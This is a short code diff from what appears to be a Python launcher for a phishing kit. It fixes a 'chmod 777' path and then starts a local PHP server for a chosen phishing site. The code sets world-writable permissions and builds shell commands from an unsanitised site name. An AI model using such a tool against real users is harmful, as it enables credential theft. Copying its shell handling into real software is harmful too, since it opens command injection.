@@ -53,7 +53,7 @@ time.sleep(1)
 
 # Start the php server
 print("Starting php server...")
-os.system("sudo chmod 777 /phish-server/sites/{}".format(website))  # Add permissions for the php files to read and write
+os.system("sudo chmod 777 /phish-server/aws/sites/{}".format(website))  # Add permissions for the php files to read and write
 os.system("cd /phish-server/aws/sites/{}/ && sudo php -S 127.0.0.1:3333 > /dev/null 2&>1 & sleep 2".format(website))
 
 # Start the web server
